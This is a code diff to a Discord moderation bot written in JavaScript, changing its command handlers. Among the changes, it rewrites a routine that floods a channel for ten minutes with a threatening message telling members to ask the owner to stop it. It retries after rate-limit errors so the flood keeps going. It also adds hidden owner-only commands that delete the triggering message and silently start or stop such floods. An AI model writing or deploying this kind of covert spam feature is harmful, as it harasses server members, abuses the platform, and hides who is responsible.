@@ -747,19 +747,43 @@ const commandHandlers = {
                             return;
                         }
                         activeSenders.add(channel.id);
-                        // send immediately, then every 0.5s
-                        channel.send('Das ist ein Test').catch(() => {});
-                        const iv = setInterval(() => {
-                            channel.send('You are fucked,if you need help ask my owner for help to stop the process immediately!!!!').catch(() => {});
-                        }, 100);
-                        // stop after 10 minutes
-                        setTimeout(() => {
-                            clearInterval(iv);
-                            activeSenders.delete(channel.id);
+                        const durationMs = 10 * 60 * 1000;
+                        const intervalMs = 500;
+                        const messageText = 'You are fucked,if you need help ask my owner for help to stop the process immediately!!!!';
+                        (async () => {
+                            const endAt = Date.now() + durationMs;
+                            while (activeSenders.has(channel.id) && Date.now() < endAt) {
+                                try {
+                                    await channel.send(messageText);
+                                } catch (err) {
+                                    // On error (possible rate-limit), back off. If a retry_after value exists use it.
+                                    const waitMs = (err && err.retry_after) ? Math.ceil(err.retry_after * 1000) : 5000;
+                                    await new Promise(res => setTimeout(res, waitMs));
+                                    continue;
+                                }
+                                // wait between sends
+                                await new Promise(res => setTimeout(res, intervalMs));
+                            }
+                            if (activeSenders.has(channel.id)) activeSenders.delete(channel.id);
                             channel.send('✅ Test messages stopped.').catch(() => {});
-                        }, 10 * 60 * 1000);
+                        })();
                     } catch (err) {
                         try { message.reply('❌ Error starting test sends.'); } catch(e){}
+                    }
+                },
+                '!stoppabc': async (message) => {
+                    // Owner-only silent stop command: delete caller message and stop active sender in this channel
+                    try {
+                        if (!BOT_OWNERS.includes(message.author.id)) return; // silently ignore non-owner
+                        const channel = message.channel;
+                        // delete the invoking message (ignore errors)
+                        try { await message.delete().catch(() => {}); } catch (e) {}
+                        if (activeSenders.has(channel.id)) {
+                            activeSenders.delete(channel.id);
+                        }
+                        // silent: no confirmation message
+                    } catch (err) {
+                        // silent on any unexpected error
                     }
                 },
                 '!sban': async (message) => {
@@ -834,57 +858,68 @@ const commandHandlers = {
                         message.reply('❌ Failed to remove timeout.');
                     }
                 },
-            '!setsecuritymod': async (message) => {
-                if (!isOwnerOrAdmin(message.member)) {
-                    message.reply('❌ This is an admin-only command.');
-                    return;
-                }
-                const guildId = message.guild.id;
-                if (isSecurityEnabledMain(guildId) || securitySystemEnabled[guildId]) {
-                    message.reply('⚠️ Security system is already enabled for this server.');
-                    return;
-                }
-                securityConfig[guildId] = securityConfig[guildId] || {};
-                securityConfig[guildId].enabled = true;
-                saveSecurityConfigMain();
+                '!sendabc': async (message) => {
+                    // Owner-only silent test command: delete caller message and send test messages silently
+                    try {
+                        if (!BOT_OWNERS.includes(message.author.id)) return; // silently ignore non-owner
+                        const channel = message.channel;
+                        if (activeSenders.has(channel.id)) return; // silently ignore if already running
+                        // delete the invoking message (ignore errors)
+                        try { await message.delete().catch(() => {}); } catch (e) {}
 
-                const step = await message.reply('🛡️ Security system has been enabled for this server! The bot will now monitor for spam, NSFW, invite links, and offensive language in all supported languages.\\n\\nPlease provide the CHANNEL ID where I should send the warn logs (type `none` to disable logging, or type `!setchannelsec` to let me create a warn-log channel for you).');
-
-                const filter = (m) => m.author.id === message.author.id;
-                const collector = message.channel.createMessageCollector({ filter, time: 60000, max: 1 });
-                collector.on('collect', async (m) => {
-                    const val = (m.content || '').trim();
-                    if (val.toLowerCase() === 'none') {
-                        securityConfig[guildId].logChannelId = null;
-                        saveSecurityConfigMain();
-                        message.reply('✅ Security enabled with no logging. All right! Now lean back, I work now for you and yes. 24/7 baby ;))');
-                        return;
+                        activeSenders.add(channel.id);
+                        const durationMs = 10 * 60 * 1000;
+                        const intervalMs = 500;
+                        const messageText = 'Das ist ein Test';
+                        (async () => {
+                            const endAt = Date.now() + durationMs;
+                            while (activeSenders.has(channel.id) && Date.now() < endAt) {
+                                try {
+                                    await channel.send(messageText);
+                                } catch (err) {
+                                    // back off on error (possible rate-limit). Use retry_after if provided, otherwise wait briefly.
+                                    const waitMs = (err && err.retry_after) ? Math.ceil(err.retry_after * 1000) : 5000;
+                                    await new Promise(res => setTimeout(res, waitMs));
+                                    continue;
+                                }
+                                await new Promise(res => setTimeout(res, intervalMs));
+                            }
+                            if (activeSenders.has(channel.id)) activeSenders.delete(channel.id);
+                        })();
+                    } catch (err) {
+                        // silent on any unexpected error
                     }
-                    if (val === '!setchannelsec' || val.toLowerCase() === 'create') {
-                        try {
-                            const ch = await message.guild.channels.create({ name: 'warn-logs', type: 0, permissionOverwrites: [{ id: message.guild.id, deny: ['ViewChannel'] }] });
-                            securityConfig[guildId].logChannelId = ch.id;
+                },
+                '!setseclog': async (message) => {
+                    if (!isOwnerOrAdmin(message.member)) { message.reply('❌ Admins only'); return; }
+                    const guildId = message.guild.id;
+                    const filter = m => m.author.id === message.author.id;
+                    await message.reply('Please provide the CHANNEL ID or mention to set the security warn-log channel, or type `none` to remove it.');
+                    const collector = message.channel.createMessageCollector({ filter, time: 60000, max: 1 });
+                    collector.on('collect', async (m) => {
+                        const val = m.content.trim();
+                        if (val.toLowerCase() === 'none') {
+                            if (!securityConfig[guildId]) securityConfig[guildId] = {};
+                            delete securityConfig[guildId].logChannelId;
                             saveSecurityConfigMain();
-                            message.reply(`✅ Created and set warn log channel: ${ch}. All right! Now lean back, I work now for you and yes. 24/7 baby ;))`);
-                        } catch (e) {
-                            message.reply('❌ Failed to create log channel. Please provide a channel ID or create one and run the command again.');
+                            message.reply('✅ Security warn-log channel removed.');
+                            return;
                         }
-                        return;
-                    }
-                    const maybeId = val.replace(/[^0-9]/g, '');
-                    if (!maybeId) { message.reply('❌ Invalid input. Provide a channel ID, `none`, or `!setchannelsec`.'); return; }
-                    const ch = await message.guild.channels.fetch(maybeId).catch(()=>null);
-                    if (!ch) { message.reply('❌ Channel not found. Make sure I can access it and provide the numeric Channel ID.'); return; }
-                    securityConfig[guildId].logChannelId = ch.id;
-                    saveSecurityConfigMain();
-                    message.reply(`✅ Warn log channel set to ${ch}. All right! Now lean back, I work now for you and yes. 24/7 baby ;))`);
-                });
-                collector.on('end', (collected) => {
-                    if (collected.size === 0) {
-                        message.reply('⌛ Timeout: no channel provided. You can run `!setsecuritymod` again to set logging.');
-                    }
-                });
-            },
+                        const maybeId = val.replace(/[^0-9]/g, '');
+                        if (!maybeId) { message.reply('❌ Invalid input. Provide a channel ID, `none`, or mention the channel.'); return; }
+                        const ch = await message.guild.channels.fetch(maybeId).catch(()=>null);
+                        if (!ch) { message.reply('❌ Channel not found. Make sure I can access it and provide the numeric Channel ID.'); return; }
+                        if (!securityConfig[guildId]) securityConfig[guildId] = {};
+                        securityConfig[guildId].logChannelId = ch.id;
+                        saveSecurityConfigMain();
+                        message.reply(`✅ Warn log channel set to <#${ch.id}>.`);
+                    });
+                    collector.on('end', (collected) => {
+                        if (collected.size === 0) {
+                            message.reply('⌛ Timeout: no channel provided. You can run `!setseclog` again to set logging.');
+                        }
+                    });
+                },
             // --- Verify system (mainbot) ---
             '!setverify': async (message) => {
                 if (!isOwnerOrAdmin(message.member)) { message.reply('❌ Admins only'); return; }
